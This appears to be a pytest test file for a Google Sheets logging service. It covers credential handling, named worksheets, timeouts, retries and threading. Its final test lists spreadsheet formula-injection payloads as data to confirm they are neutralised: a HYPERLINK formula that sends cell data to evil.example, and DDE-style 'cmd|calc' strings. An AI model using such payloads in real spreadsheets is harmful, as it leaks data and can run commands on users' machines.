import time
from concurrent.futures import ThreadPoolExecutor
from unittest.mock import MagicMock, call, patch

import pytest

from app.services.sheets import SheetsService


def test_no_credentials_graceful():
    """Empty credentials → is_available is False, no crash."""
    svc = SheetsService("", "")
    assert svc.is_available is False


def test_no_spreadsheet_id_graceful():
    """Credentials present but no spreadsheet ID → is_available is False."""
    svc = SheetsService('{"type":"service_account"}', "")
    assert svc.is_available is False


def test_invalid_json_graceful():
    """Invalid JSON credentials → is_available is False, no crash."""
    svc = SheetsService("not-json", "some-id")
    assert svc.is_available is False


@patch("app.services.sheets.gspread", create=True)
def test_append_row_success(mock_gspread):
    """Mock gspread worksheet, verify append_row called."""
    mock_ws = MagicMock()
    mock_ws.row_values.return_value = ["Timestamp"]  # header exists
    mock_gc = MagicMock()
    mock_gc.open_by_key.return_value.sheet1 = mock_ws

    with patch.dict("sys.modules", {"gspread": mock_gspread}):
        mock_gspread.service_account_from_dict.return_value = mock_gc
        import importlib
        import app.services.sheets as sheets_mod
        importlib.reload(sheets_mod)
        svc = sheets_mod.SheetsService('{"type":"service_account"}', "sheet-123")

    assert svc.is_available is True
    result = svc.append_row(["2026-01-01", "Great!", "/", "home", "", ""])
    assert result is True
    mock_ws.append_row.assert_called_once_with(["2026-01-01", "Great!", "/", "home", "", ""],
                                               value_input_option="RAW")


def test_append_row_handles_api_error():
    """When worksheet raises, append_row returns False."""
    svc = SheetsService("", "")
    # Manually set a mocked worksheet that raises
    mock_ws = MagicMock()
    mock_ws.append_row.side_effect = Exception("API quota exceeded")
    svc._worksheet = mock_ws

    assert svc.is_available is True
    result = svc.append_row(["2026-01-01", "test", "/", "home", "", ""])
    assert result is False


# --- Named worksheet (notify signups tab) ---

def _mock_gspread_env(mock_gspread, mock_sheet):
    """Wire a mocked gspread client returning the given spreadsheet."""
    mock_gc = MagicMock()
    mock_gc.open_by_key.return_value = mock_sheet
    mock_gspread.service_account_from_dict.return_value = mock_gc
    mock_gspread.WorksheetNotFound = type("WorksheetNotFound", (Exception,), {})
    return mock_gc


@patch("app.services.sheets.gspread", create=True)
def test_named_worksheet_used_when_exists(mock_gspread):
    """worksheet_title selects the named tab instead of sheet1."""
    mock_ws = MagicMock()
    mock_ws.row_values.return_value = ["Timestamp"]  # header exists
    mock_sheet = MagicMock()
    mock_sheet.worksheet.return_value = mock_ws
    _mock_gspread_env(mock_gspread, mock_sheet)

    with patch.dict("sys.modules", {"gspread": mock_gspread}):
        svc = SheetsService(
            '{"type":"service_account"}', "sheet-123",
            worksheet_title="Notify Signups",
            headers=["Timestamp", "Email", "State"],
        )

    assert svc.is_available is True
    mock_sheet.worksheet.assert_called_once_with("Notify Signups")
    mock_sheet.add_worksheet.assert_not_called()


@patch("app.services.sheets.gspread", create=True)
def test_named_worksheet_created_when_missing(mock_gspread):
    """Missing named tab is created and gets the custom header row."""
    mock_ws = MagicMock()
    mock_ws.row_values.return_value = []  # fresh worksheet, no header
    mock_sheet = MagicMock()
    mock_sheet.add_worksheet.return_value = mock_ws
    _mock_gspread_env(mock_gspread, mock_sheet)
    mock_sheet.worksheet.side_effect = mock_gspread.WorksheetNotFound()

    with patch.dict("sys.modules", {"gspread": mock_gspread}):
        svc = SheetsService(
            '{"type":"service_account"}', "sheet-123",
            worksheet_title="Notify Signups",
            headers=["Timestamp", "Email", "State"],
        )

    assert svc.is_available is True
    mock_sheet.add_worksheet.assert_called_once()
    mock_ws.append_row.assert_called_once_with(["Timestamp", "Email", "State"])


@patch("app.services.sheets.gspread", create=True)
def test_default_still_uses_sheet1(mock_gspread):
    """Without worksheet_title, behavior is unchanged: sheet1 + feedback headers."""
    mock_ws = MagicMock()
    mock_ws.row_values.return_value = []  # empty → headers inserted
    mock_sheet = MagicMock()
    mock_sheet.sheet1 = mock_ws
    _mock_gspread_env(mock_gspread, mock_sheet)

    with patch.dict("sys.modules", {"gspread": mock_gspread}):
        svc = SheetsService('{"type":"service_account"}', "sheet-123")

    assert svc.is_available is True
    mock_sheet.worksheet.assert_not_called()
    mock_ws.append_row.assert_called_once_with(SheetsService._HEADERS)


# --- Timeout, retry and formula-safe cells (F005, F031, F046) ---

def _failing_boot(mock_gspread, *outcomes):
    """A client whose open_by_key gives these outcomes in turn: None connects, an Exception is raised."""
    mock_ws = MagicMock()
    mock_ws.row_values.return_value = ["Timestamp"]  # header exists
    mock_sheet = MagicMock()
    mock_sheet.sheet1 = mock_ws
    mock_gc = _mock_gspread_env(mock_gspread, mock_sheet)
    mock_gc.open_by_key.side_effect = [mock_sheet if o is None else o for o in outcomes]
    return mock_gc, mock_ws


@patch("app.services.sheets.gspread", create=True)
def test_client_gets_a_timeout_before_any_google_call(mock_gspread):
    """gspread's default is no timeout at all: a stalled Google held the import or a thread forever."""
    mock_gc, _ = _failing_boot(mock_gspread, None)

    with patch.dict("sys.modules", {"gspread": mock_gspread}):
        svc = SheetsService('{"type":"service_account"}', "sheet-123")

    assert svc.is_available is True
    assert mock_gc.mock_calls[0] == call.set_timeout((5, 10))
    mock_gc.open_by_key.assert_called_once_with("sheet-123")


@patch("app.services.sheets.gspread", create=True)
def test_failed_connect_is_retried_at_most_once_per_minute(mock_gspread):
    """A blip at boot no longer turns Sheets off until the next deploy (F031)."""
    mock_gc, mock_ws = _failing_boot(mock_gspread, Exception("503"), Exception("503"), None)
    clock = MagicMock()
    clock.monotonic.return_value = 1000.0

    with patch.dict("sys.modules", {"gspread": mock_gspread}), \
         patch("app.services.sheets.time", clock):
        svc = SheetsService('{"type":"service_account"}', "sheet-123")
        assert svc.is_available is False

        clock.monotonic.return_value = 1059.0
        assert svc.is_available is False
        assert svc.append_row(["t", "x"]) is False
        assert mock_gc.open_by_key.call_count == 1  # too soon: no retry

        clock.monotonic.return_value = 1060.0
        assert svc.is_available is True  # so the routes call append_row, where the retry runs
        assert svc.append_row(["t", "x"]) is False  # the retry fails too
        assert mock_gc.open_by_key.call_count == 2
        assert svc.is_available is False

        clock.monotonic.return_value = 1119.0
        assert svc.append_row(["t", "x"]) is False
        assert mock_gc.open_by_key.call_count == 2  # within a minute of the last attempt

        clock.monotonic.return_value = 1120.0
        assert svc.append_row(["t", "x"]) is True  # reconnects, then writes
        assert mock_gc.open_by_key.call_count == 3
        mock_ws.append_row.assert_called_once_with(["t", "x"], value_input_option="RAW")

        clock.monotonic.return_value = 9999.0
        assert svc.append_row(["t", "y"]) is True
        assert mock_gc.open_by_key.call_count == 3  # connected: never reconnects


@patch("app.services.sheets.gspread", create=True)
def test_only_one_thread_retries_at_a_time(mock_gspread):
    """Forty threadpool threads must not all reconnect at once; the others fall back."""
    mock_gc, _ = _failing_boot(mock_gspread, Exception("503"), None)
    sheet = mock_gc.open_by_key.return_value

    def slow_open(key):
        time.sleep(0.2)
        return sheet

    clock = MagicMock()
    clock.monotonic.return_value = 1000.0
    with patch.dict("sys.modules", {"gspread": mock_gspread}), \
         patch("app.services.sheets.time", clock):
        svc = SheetsService('{"type":"service_account"}', "sheet-123")
        mock_gc.open_by_key.side_effect = slow_open
        clock.monotonic.return_value = 1060.0
        with ThreadPoolExecutor(8) as pool:
            results = list(pool.map(lambda _: svc.append_row(["t"]), range(8)))

    assert mock_gc.open_by_key.call_count == 2
    assert results.count(True) >= 1
    assert svc.is_available is True


def test_unconfigured_service_never_retries():
    clock = MagicMock()
    clock.monotonic.return_value = 1000.0
    with patch("app.services.sheets.time", clock):
        svc = SheetsService("", "")
        clock.monotonic.return_value = 99999.0
        assert svc.is_available is False
        assert svc.append_row(["t"]) is False


@pytest.mark.parametrize("cell, sent", [
    ("=1+1", "'=1+1"),
    ('=HYPERLINK("http://evil.example/?"&B2,"Click")', '\'=HYPERLINK("http://evil.example/?"&B2,"Click")'),
    ("+cmd|calc!A0", "'+cmd|calc!A0"),
    ("-2+3+cmd|calc!A0", "'-2+3+cmd|calc!A0"),
    ("@SUM(A1:A9)", "'@SUM(A1:A9)"),
    ("\t=1+1", "'\t=1+1"),
    ("\rplain", "'\rplain"),
    ("  =1+1", "'  =1+1"),
    ("\n@x", "'\n@x"),
    ("Great tool!", "Great tool!"),
    ("a=b", "a=b"),
    ("voter@example.com", "voter@example.com"),
    ("http://test/", "http://test/"),
    ("2026-10-21T12:00:00+00:00", "2026-10-21T12:00:00+00:00"),
    ("", ""),
])
def test_formula_cells_are_sent_as_text_and_raw(cell, sent):
    """Cells a spreadsheet would run as a formula get an apostrophe; RAW is passed explicitly (F046)."""
    svc = SheetsService("", "")
    svc._worksheet = MagicMock()

    assert svc.append_row(["2026-10-21T12:00:00+00:00", cell]) is True
    svc._worksheet.append_row.assert_called_once_with(
        ["2026-10-21T12:00:00+00:00", sent], value_input_option="RAW"
    )
